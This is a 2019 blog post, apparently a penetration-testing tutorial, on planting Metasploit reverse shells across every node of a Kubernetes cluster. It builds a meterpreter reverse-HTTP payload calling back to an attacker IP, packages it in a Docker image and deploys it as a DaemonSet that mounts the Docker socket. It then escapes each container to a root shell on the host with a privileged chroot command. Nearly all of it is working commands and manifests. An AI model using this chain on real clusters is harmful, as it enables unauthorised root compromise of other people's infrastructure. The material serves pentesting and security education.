---
layout: post
title: "Making it Rain shells in Kubernetes"
date: 2019-08-10 07:10:39 +0100
comments: false
categories: Kubernetes
---

Following on from the [last post](https://raesene.github.io/blog/2019/08/09/docker-reverse-shells/) in this series lets setup a rather more ambitious set of reverse shells when attacking a Kubernetes cluster.

The scenario here is that we've got the ability to create a `daemonset` object in a target Kubernetes cluster and we'd like to have shells on every node in the cluster which have the Docker socket exposed, so we can get a root shell on every node in the cluster.

To do this we'll need something that'll easily handle multiple incoming shells, so we'll turn to the [Metasploit Framework](https://www.metasploit.com/) and specifically, `exploit/multi/handler`

## Step 1: Create the payload

We need a Docker image that we can deploy to the cluster which will have our payload to connect back to the listener that we're going to setup and will run on each node in the cluster.

For this we can run msfvenom to setup our payload and then embed that into a Docker image.

In this case our pentester machine will be on `192.168.200.1` . To avoid managing all Metasploit's dependencies we can just run it in a Docker container.

This command will generate our payload

```
docker run raesene/metasploit ./msfvenom -p linux/x64/meterpreter_reverse_http LHOST=192.168.200.1 LPORT=8989 -f elf > reverse_shell.elf
```

### Setting up the Docker Image

Next run this command to get the Docker GPG key into your directory

```
curl https://download.docker.com/linux/ubuntu/gpg > docker.gpg
```

We can now create a Dockerfile to host this shell and upload it to Docker hub.  The Dockerfile is a pretty simple one, we'll need out payload and also the Docker client, for later use.

```
FROM ubuntu:18.04

RUN apt update && apt install -y apt-transport-https ca-certificates curl software-properties-common

COPY docker.gpg /docker.gpg

RUN apt-key add /docker.gpg

RUN add-apt-repository \
   "deb [arch=amd64] https://download.docker.com/linux/ubuntu \
   $(lsb_release -cs) \
   stable"

RUN apt-get install -y docker-ce-cli

COPY reverse_shell.elf /reverse_shell.elf

RUN chmod +x /reverse_shell.elf

CMD ["/reverse_shell.elf"]
```

Build it with (replace raesene below with your own docker hub name)

```
docker build -t raesene/reverse_shell .
```

Then you can login to Docker hub with `docker login` and upload with

```
docker push raesene/reverse_shell
```

At this point we can test our reverse shell on a single machine by setting up a Metasploit listener and check that all is well.

## Step 2: Setting up Metasploit to receive our shells

On the pentester machine start-up the metasploit console with

```
msfconsole
```

then 

```
use exploit/multi/handler
```

and set our variables, in the same way we did with `msfvenom` earlier

```
set payload linux/x64/meterpreter_reverse_http
set LHOST 192.168.200.1
set LPORT 8989
set ExitOnSession false
```

With those set, we can start it up to listen for incoming shells

```
exploit -j
```

Now on a target machine run our shell and we should get that back on the metasploit console

```
docker run raesene/reverse_shell
```

Assuming that's all working we're ready to scale it up to our Kubernetes cluster

## Step 3: Using a Daemonset to compromise a cluster

So we want a workload which will run on every node in the cluster, and that's exactly what a daemonset will do for us.  We'll need a manifest that creates our daemonset and also we want it to expose the Docker socket so we can easily break out of each of our containers to the underlying host.

This should work fine, unless the cluster has a PodSecurityPolicy blocking the mounting of the docker socket inside a container.

We'll call our manifest `reverse-shell-daemonset.yml` and it should contain this :-

```
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: reverse-shell-daemonset
  labels:
spec:
  selector:
    matchLabels:
      name: reverse-shell-daemonset
  template:
    metadata:
      labels:
        name: reverse-shell-daemonset
    spec:
      tolerations:
      - key: node-role.kubernetes.io/master
        effect: NoSchedule
      containers:
      - name: revshell
        image: raesene/reverse-shell
        volumeMounts:
        - mountPath: /var/run/docker.sock
          name: dockersock
      volumes:
      - name: dockersock
        hostPath:
          path: /var/run/docker.sock
```

Once you've got your manifest ready, just apply it to the cluster with

```
kubectl create -f reverse-shell-daemonset.yml
```

Back on your metasploit console you should see your shells pop in, one for each node :)

### Getting to root on the nodes

So once you've got your shells working, you can interact with them from the Metasploit console 

```
sessions -l 
```

Will show you your active sessions.  Then 

```
sessions -i 1
```

Will let you interact with one of them

```
shell
````

should give you a shell inside the container running on one of our nodes. Now the last part is to use the exposed Docker Socket to get a root shell on the underlying host.

To Do this we can juse make use of the every handy [Most Pointless Docker Command Ever](https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/)

Running 

```
docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host
```

and it'll dump us out to a root shell on the underlying node :)